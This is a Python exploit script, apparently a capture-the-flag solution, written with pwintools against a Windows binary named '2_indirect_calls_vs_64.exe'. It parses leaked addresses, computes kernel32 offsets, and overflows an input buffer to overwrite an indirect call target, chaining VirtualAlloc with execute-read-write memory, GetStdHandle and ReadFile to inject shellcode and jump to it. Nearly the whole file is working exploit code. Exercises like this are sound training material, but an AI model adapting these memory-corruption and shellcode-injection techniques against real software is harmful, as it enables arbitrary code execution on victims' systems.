
import random
from pwintools import *

SIZEOF_PTR = 8
OFFS_MINUS_4 = 128 - (4 - 2) * SIZEOF_PTR # this is the offset to inject the call target with binary operator
OP_MINUS_4 = bytes([b'*'[0] - 4*2]) # this is the binary operator that allows to jump to injected call target
OFFS_BIG_MINUS_2 = 128 - 2 * SIZEOF_PTR # this is the offset to inject the call target with 5-operands operator
BIGOP_MINUS_2 = bytes([b'?'[0] - 2]) # this is the 5-operands operator that allows to jump to injected call target

p = Process('2_indirect_calls_vs_64.exe')

p.set_timeout(1000 * 60 * 60 * 24)
#input('press enter after attaching the debugger')

# collect free leaks
p.recvuntil(b'is at ')
input = p.recvuntil(b'\r\n')

printFlagAddr = int(input[:16], 16)

p.recvuntil(b'is at ')
input = p.recvuntil(b'\r\n')

virtualAllocAddr = int(input[:16], 16)

print('printFlag is', hex(printFlagAddr))
print('VirtualAlloc is', hex(virtualAllocAddr))

# math time
base = printFlagAddr - 0x1050
basek = virtualAllocAddr - 0x18500
getStdHandleAddr = basek + 0x1d490
readFileAddr = basek + 0x24ee0

# prepare the shellcode to inject
# f = open('TMP64', 'rb')
# shellcode = f.read()
# f.close()
shellcode = asm('mov rax, ' + str(printFlagAddr) + '; jmp rax', 64)

# phase 1: allocate memory
p.recvuntil(b' numbers\r\n')
print('allocating memory...')
# cycle trying to alloc an address < 2GB
MAX_TRIES = 1000
for i in range(MAX_TRIES):
	# TODO different generation method?
	addr = random.randint(1, 1<<(31-12)) * 4096
	# invoke a 5-param function with the operator with index -2
	smolPayload = (
		BIGOP_MINUS_2
		+ bytes(str(addr), 'ascii')
		+ b' '
		+ bytes(str(len(shellcode)), 'ascii') # size
		+ b' '
		+ bytes(str(MEM_COMMIT | MEM_RESERVE), 'ascii')
		+ b' '
		# + bytes(str(PAGE_EXECUTE_READWRITE), 'ascii') # <= this yields 'PAGE_EXECUTE_READWRITE' as string...
		+ bytes(str(0 + PAGE_EXECUTE_READWRITE), 'ascii')
		+ b' 1337'
	)
	p.sendline(
		smolPayload
		+ b'a' * (OFFS_BIG_MINUS_2 - len(smolPayload))
		+ p64(virtualAllocAddr)
	)

	p.recvuntil(b'result is ')
	input = p.recvuntil(b'\r\n')
	allocatedMem = int(input[:-2], 10)
	if 0 != allocatedMem:
		break
	print('allocating', addr, 'failed (', i, '); trying again')

print('allocated memory at', hex(allocatedMem))
if (0 == allocatedMem):
	print('Failed to allocate mem!')

# phase 2: fetch stdin = GetStdHandle(STD_INPUT_HANDLE)
p.recvuntil(b' numbers\r\n')
print('fetching stdin...')
smolPayload = (
	bytes(str(STD_INPUT_HANDLE + (1<<32)), 'ascii')
	+ OP_MINUS_4
	+ b'9 '
)
print('smolPayload is', smolPayload)
p.sendline(
	smolPayload
	+ b'a' * (OFFS_MINUS_4 - len(smolPayload))
	+ p64(getStdHandleAddr)
)

p.recvuntil(b'result is ')
input = p.recvuntil(b'\r\n')
stdin = int(input[:-2], 10)
print('fetched stdin:', stdin)

# phase 3: trigger shellcode read
smolPayload = (
	BIGOP_MINUS_2
	+ bytes(str(stdin), 'ascii') # stream
	+ b' '
	+ bytes(str(allocatedMem), 'ascii') # buffer
	+ b' '
	+ bytes(str(len(shellcode)), 'ascii') # size
	+ b' 0 0' # dummy pointers
)
p.recvuntil(b' numbers\r\n')
print('triggering shellcode read...')
p.sendline(
	smolPayload
	+ b'a' * (OFFS_BIG_MINUS_2 - len(smolPayload))
	+ p64(readFileAddr)
)

# actual shellcode injection
print('injecting shellcode now')
p.send(shellcode)

# phase 4: jump to shellcode
p.recvuntil(b' numbers\r\n')
print('jumping to shellcode...')
p.sendline(
	b'0'
	+ OP_MINUS_4
	+ b'0 '
	+ b'a' * (OFFS_MINUS_4 - 4)
	+ p64(allocatedMem)
)

p.interactive()

